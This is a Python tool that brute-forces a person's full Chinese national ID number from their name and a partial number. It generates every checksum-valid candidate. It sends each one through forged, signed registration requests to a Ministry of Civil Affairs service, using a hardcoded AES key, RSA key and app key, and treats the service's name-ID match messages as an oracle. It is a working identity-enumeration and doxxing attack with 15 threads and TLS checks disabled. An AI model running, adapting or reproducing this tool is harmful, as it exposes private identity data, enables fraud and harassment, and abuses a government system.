# -*- coding: utf-8 -*-
import itertools
import re
import time
import random
import string
import json
import hashlib
import binascii
import ssl
import urllib.request
import urllib.error
import threading
import csv
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
# ==================== API配置 ====================
API_URL = "https://zwyd.mca.gov.cn/ggfwappbiz/public/neuRegister/register"
AES_KEY = "o7wwuqr7cy84415k"
RSA_N_HEX = "906C793510FB049452764740B21B97A51DAEA794AB6E43836269D5E6317D49226C12362BA22DAB5EC3BC79553A8A098B01F3C4D81A87B3EE5BD2F4F1431CC495EE2FE54688B212145BB32D56EEEEE1430CE26234331B291CFC53C9B84FAFFDF0B44371A032880C3D567F588D2CD5FCE28D9CDD2923CB547DAD219A6A1B8B5D3D"
RSA_E_HEX = "10001"
APP_KEY = "neujmggfw01@MZB"
# 全局地区码字典
diquma = {}
# 全局标志
found_match = False
match_result = None
match_lock = threading.Lock()
checked_count = 0
count_lock = threading.Lock()
# ==================== 工具函数(加密/签名/密码生成 完全保留原逻辑) ====================
def rand_str(n=16):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))
def aes_enc(text, key, iv):
    c = AES.new(key.encode(), AES.MODE_CBC, iv=iv.encode())
    return binascii.hexlify(c.encrypt(pad(text.encode(), AES.block_size))).decode().upper()
def aes_dec(hex_text, key, iv):
    c = AES.new(key.encode(), AES.MODE_CBC, iv=iv.encode())
    return unpad(c.decrypt(binascii.unhexlify(hex_text)), AES.block_size).decode()
def rsa_enc(text):
    n, e = int(RSA_N_HEX, 16), int(RSA_E_HEX, 16)
    m_hex = ''.join(hex(ord(c))[2:].zfill(2) for c in reversed(text))
    return hex(pow(int(m_hex, 16), e, n))[2:].zfill(256)
def sign(ts, en_str):
    return hashlib.md5(f"appKey={APP_KEY}&timestamp={ts}&enStr={en_str}".encode()).hexdigest()
def check_pwd(p):
    kb = ["qwertyuiop", "asdfghjkl", "zxcvbnm", "1234567890", "abcdefghijklmnopqrstuvwxyz"]
    p = p.lower()
    for k in kb:
        for i in range(len(k)-2):
            if k[i:i+3] in p or k[i:i+3][::-1] in p:
                return True
    return False
def generate_password():
    while True:
        pwd = list(random.choice(string.ascii_lowercase) + random.choice(string.ascii_uppercase) + 
                   random.choice(string.digits) + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(9)))
        random.shuffle(pwd)
        pwd = ''.join(pwd)
        if not check_pwd(pwd):
            return pwd
# ==================== 新版身份证生成模块(完全替换原生成逻辑) ====================
# 1. 读取地区码CSV
def init_diquma():
    global diquma
    filename = '地区码.csv'
    try:
        with open(filename, 'r', encoding='utf-8-sig') as f:
            reader = csv.reader(f)
            header = next(reader, None)
            for row in reader:
                if len(row) < 2:
                    continue
                code = row[0].strip()
                name = row[1].strip()
                if code and name:
                    diquma[code] = name
        print(f"🟢 地区码读取成功>{len(diquma)}<条")
    except FileNotFoundError:
        print(f"🔴 文件 {filename} 不存在，将无法使用地区通配符")
        diquma = {}
    except Exception as e:
        print(f"🔴 读取地区码 CSV 失败: {e}")
        diquma = {}
# 2. 模糊地址匹配对应地区码
def address_lookup(card_address):
    normalized_address = card_address.lower().replace('x', '*')
    normalized_address = normalized_address.replace('*', r'\d')
    pattern = re.compile(f'^{normalized_address}$')
    matched_areas = {}
    for code, name in diquma.items():
        if pattern.match(code):
            matched_areas[code] = name
    return matched_areas.keys()
# 3. 身份证出生日期合法性校验
def check_id_data(n):
    if len(n) < 14:
        return False
    try:
        year = int(n[6:10])
        month = int(n[10:12])
        day = int(n[12:14])
    except ValueError:
        return False
    if not (1950 <= year <= time.localtime().tm_year):
        return False
    if not (1 <= month <= 12):
        return False
    if not (1 <= day <= 31):
        return False
    if month in {4, 6, 9, 11} and day > 30:
        return False
    if month == 2:
        if (year % 4 == 0 and year % 100 != 0) or (year % 400 == 0):
            if day > 29:
                return False
        else:
            if day > 28:
                return False
    return True
# 4. 完整18位身份证合法性校验
def check_id(n):
    if len(n) != 18:
        return False
    var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
    try:
        sum_val = 0
        for i in range(17):
            sum_val += int(n[i]) * var[i]
    except ValueError:
        return False
    sum_val %= 11
    return var_id[sum_val] == n[17]
# 5. 通过前17位计算最后一位校验码
def calculate_check_digit(first_17):
    var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
    try:
        sum_val = 0
        for i in range(17):
            sum_val += int(first_17[i]) * var[i]
        sum_val %= 11
        return var_id[sum_val]
    except:
        return None
# 6. 获取用户输入的出生年份范围（已适配2026）
def get_year_range(year_pattern):
    normalized_pattern = year_pattern.lower().replace('x', '*')
    if '*' not in normalized_pattern:
        year = int(normalized_pattern)
        return (year, year)
    while True:
        try:
            year_input = input("请输入年份范围(格式:1990-1999): ").strip()
            if re.match(r'^\d{4}-\d{4}$', year_input):
                start_year, end_year = map(int, year_input.split('-'))
                if 1950 <= start_year <= end_year <= 2026:
                    return (start_year, end_year)
                else:
                    print("年份范围无效 请确保在1950-2026之间且开始年份<=结束年份")
            else:
                print("格式错误 请使用XXXX-XXXX格式")
        except ValueError:
            print("请输入有效的数字")
# 7. 根据顺序码规则判定性别
def get_gender_from_seq(seq_pattern, input_gender=None):
    if input_gender in ["男", "女"]:
        return input_gender
    if seq_pattern[-1] != '*':
        last_digit = seq_pattern[-1]
        if last_digit in '13579':
            return '男'
        elif last_digit in '02468':
            return '女'
        else:
            return '未知'
    else:
        print(f"顺序码模式: {seq_pattern} (第17位未知)")
        gender_input = input("请输入性别(男/女/未知直接回车): ").strip()
        gender_input = gender_input if gender_input in ['男', '女', '未知'] else '未知'
        return gender_input
# 8. 核心生成函数
def generate_possible_ids(card, input_gender=None):
    if 'x' in card and '*' in card:
        print("错误:不能同时使用'x'和'*'作为占位符")
        return []
    normalized_card = card.replace('x', '*')
    if len(normalized_card) != 18:
        print("错误:身份证号码长度不正确! 必须是18位")
        return []
    address_pattern = normalized_card[:6]
    year_pattern = normalized_card[6:10]
    month_pattern = normalized_card[10:12]
    day_pattern = normalized_card[12:14]
    seq_pattern = normalized_card[14:17]
    check_pattern = normalized_card[17]
    if '*' in address_pattern:
        address_list = list(address_lookup(address_pattern))
        if not address_list:
            print("未找到匹配的地区码")
            return []
        print(f"地区: 匹配到 {len(address_list)} 个地区")
    else:
        address_list = [address_pattern]
        print(f"地区: {diquma.get(address_pattern, '未知地区')}")
    if '*' in year_pattern:
        year_range = get_year_range(year_pattern)
    else:
        year_range = (int(year_pattern), int(year_pattern))
    month_digits = []
    for i, char in enumerate(month_pattern):
        if char == '*':
            if i == 0:
                month_digits.append(['0', '1'])
            else:
                month_digits.append(list('0123456789'))
        else:
            month_digits.append([char])
    day_digits = []
    for i, char in enumerate(day_pattern):
        if char == '*':
            if i == 0:
                day_digits.append(['0', '1', '2', '3'])
            else:
                day_digits.append(list('0123456789'))
        else:
            day_digits.append([char])
    gender = get_gender_from_seq(seq_pattern, input_gender)
    seq_digits = []
    for i, char in enumerate(seq_pattern):
        if char == '*':
            if i == 2:
                if gender == '男':
                    seq_digits.append(['1', '3', '5', '7', '9'])
                elif gender == '女':
                    seq_digits.append(['0', '2', '4', '6', '8'])
                else:
                    seq_digits.append(list('0123456789'))
            else:
                seq_digits.append(list('0123456789'))
        else:
            seq_digits.append([char])
    total_years = year_range[1] - year_range[0] + 1
    total_months = len(list(itertools.product(*month_digits)))
    total_days = len(list(itertools.product(*day_digits)))
    total_seq = 1
    for digit_list in seq_digits:
        total_seq *= len(digit_list)
    total_possibilities = len(address_list) * total_years * total_months * total_days * total_seq
    print(f"估算总组合数: {total_possibilities}")
    print("开始生成有效身份证号码...")
    valid_ids = set()
    start_time = time.time()
    with tqdm(total=total_possibilities, desc="生成", unit="个", colour='Yellow') as pbar:
        for address_code in address_list:
            for year in range(year_range[0], year_range[1] + 1):
                year_str = str(year)
                for month_combo in itertools.product(*month_digits):
                    month_str = ''.join(month_combo)
                    month_int = int(month_str)
                    if month_int < 1 or month_int > 12:
                        pbar.update(total_days * total_seq)
                        continue
                    if month_int in {4, 6, 9, 11}:
                        max_day = 30
                    elif month_int == 2:
                        if (year % 4 == 0 and year % 100 != 0) or (year % 400 == 0):
                            max_day = 29
                        else:
                            max_day = 28
                    else:
                        max_day = 31
                    for day_combo in itertools.product(*day_digits):
                        day_str = ''.join(day_combo)
                        day_int = int(day_str)
                        if day_int < 1 or day_int > max_day:
                            pbar.update(total_seq)
                            continue
                        for seq_combo in itertools.product(*seq_digits):
                            seq_str = ''.join(seq_combo)
                            first_17 = address_code + year_str + month_str + day_str + seq_str
                            check_digit = calculate_check_digit(first_17)
                            if check_digit is None:
                                pbar.update(1)
                                continue
                            if check_pattern != '*' and check_digit.upper() != check_pattern.upper():
                                pbar.update(1)
                                continue
                            full_id = first_17 + check_digit
                            valid_ids.add(full_id)
                            pbar.update(1)
    print(f"生成耗时: {time.time() - start_time:.2f} 秒")
    # 自动保存到sfz.txt
    if valid_ids:
        with open("sfz.txt", "w", encoding="utf-8") as f:
            for idcard in valid_ids:
                f.write(idcard + "\n")
        print(f"🟢 已自动保存 {len(valid_ids)} 条身份证至 sfz.txt")
    return list(valid_ids) if valid_ids else []
# ==================== API核验模块(已集成 匹配即急停) ====================
def parse_response(resp):
    errs = resp.get("errors", [])
    if resp.get("serviceSuccess") and not errs:
        return True, "二要素匹配"
    if errs:
        msg = errs[0].get("msg", "")
        if "已被注册" in msg:
            return True, "已被注册"
        if "不匹配" in msg:
            return False, "姓名与身份证号不匹配"
        return None, msg
    return None, "无法判断"

def verify_single(name, cert_no, max_retries=100):
    """核验单个身份证，命中匹配立即全局急停"""
    global found_match, match_result, checked_count
    # 已有匹配，直接退出
    if found_match:
        return cert_no, None, "已急停"

    for attempt in range(1, max_retries + 1):
        # 每次重试前检查停止标记
        if found_match:
            return cert_no, None, "已急停"

        iv = rand_str()
        loginid = random.choice(string.ascii_lowercase) + rand_str(11)
        pwd = generate_password()
        ts = int(time.time() * 1000)
        payload = {
            "loginid": loginid,
            "password": rsa_enc(pwd),
            "accountType": "10",
            "name": name,
            "certType": "111",
            "certNo": cert_no,
            "mobile": "18888888888",
            "nationality": "CHN",
            "field3": "2026-05-18",
            "field4": "2031-05-18",
            "registerType": "1",
            "PLATFORM": "4",
            "PLATFORMID": "oFtC6s8ajY9CyBkpVW95srxe25ZA",
            "timestamp": ts
        }
        en_str = aes_enc(json.dumps(payload, separators=(',', ':')), AES_KEY, iv)
        body = {
            "enStr": en_str,
            "sign": sign(ts, en_str),
            "iv": rsa_enc(iv)
        }
        headers = {
            'Referer': 'https://servicewechat.com/wx12f5a00807e3ec6a/137/page-frame.html',
            'Content-Type': 'application/json',
            'PLATFORM': '4',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36',
            'Host': 'zwyd.mca.gov.cn'
        }
        try:
            req = urllib.request.Request(API_URL, data=json.dumps(body, separators=(',', ':')).encode(),
                                         headers=headers, method='POST')
            with urllib.request.urlopen(req, context=ssl._create_unverified_context(), timeout=15) as resp:
                data = json.loads(resp.read().decode())
                result = aes_dec(data["data"], AES_KEY, iv) if data.get("data") else json.dumps(data)
                resp_json = json.loads(result) if isinstance(result, str) else result
                is_match, msg = parse_response(resp_json)

                # 匹配成功 -> 触发全局急停
                if is_match is True:
                    with match_lock:
                        if not found_match:
                            found_match = True
                            match_result = (cert_no, msg)
                            print(f"\n🚨 已找到匹配项，立即停止所有任务！")
                    with count_lock:
                        checked_count += 1
                        print(f"[{checked_count}] {cert_no} -> 🟢 ({msg})")
                    return cert_no, True, msg

                # 明确不匹配
                if is_match is False:
                    with count_lock:
                        checked_count += 1
                        print(f"[{checked_count}] {cert_no} -> 🔴 ({msg})")
                    return cert_no, False, msg

                # 临时错误重试
                retry_keywords = ["键盘连续字符", "无法判断", "密码", "网络", "超时", "服务", "繁忙"]
                if attempt < max_retries and any(kw in msg for kw in retry_keywords):
                    continue
                else:
                    with count_lock:
                        checked_count += 1
                        print(f"[{checked_count}] {cert_no} -> ❗️ ({msg})")
                    return cert_no, None, msg

        except Exception as e:
            if attempt < max_retries:
                continue
            else:
                with count_lock:
                    checked_count += 1
                    print(f"[{checked_count}] {cert_no} -> ❗️ (错误: {str(e)[:100]})")
                return cert_no, None, str(e)
    return cert_no, None, "未知错误"

# ==================== 主程序 ====================
def main():
    global found_match, match_result, checked_count
    # 初始化地区码
    init_diquma()
    print("外传死爹娘")
    name = input("请输入姓名: ").strip()
    if not name:
        print("🔴 姓名不能为空")
        return
    # 校验身份证模板输入
    while True:
        card_template = input("请输入模糊身份证(模糊请输入*或x):").strip()
        if len(card_template) != 18:
            print("错误:必须输入18位字符！")
            continue
        valid_chars = set('0123456789xX*')
        if not all(c in valid_chars for c in card_template):
            print("错误:仅支持数字、x、X、*")
            continue
        if 'x' in card_template and '*' in card_template:
            print("错误:不可同时使用x和*")
            continue
        known = card_template.replace('*', '').replace('x', '').replace('X', '')
        if len(known) < 6:
            print("错误:至少输入6位已知数字")
            continue
        break
    gender = input("请输入性别(男/女，直接回车表示未知): ").strip()
    if gender not in ["男", "女"]:
        gender = None
    # 生成所有有效身份证
    print("生成身份证...")
    id_list = generate_possible_ids(card_template, gender)
    if not id_list:
        print("🔴 未生成有效身份证号")
        return
    # 固定线程数
    max_workers = 15
    # 重置计数器
    checked_count = 0
    found_match = False
    match_result = None
    print(f"开始批量核验，共 {len(id_list)} 个待核验号码")
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(verify_single, name, cert_no): cert_no for cert_no in id_list}
        for future in as_completed(futures):
            # 检测到匹配，取消全部任务并退出循环
            if found_match:
                print("📌 正在终止剩余线程任务...")
                for f in futures:
                    if not f.done():
                        f.cancel()
                break
            try:
                future.result(timeout=30)
            except Exception:
                continue
    # 输出最终结果
    if found_match and match_result:
        cert_no, msg = match_result
        print(f"\n===== 最终结果 =====")
        print(f"🟢 找到匹配! 身份证: {cert_no}")
        print(f"   信息: {msg}")
    else:
        print(f"\n===== 最终结果 =====")
        print(f"🔴 未找到匹配的身份证，共核验 {checked_count} 条")

if __name__ == "__main__":
    main()
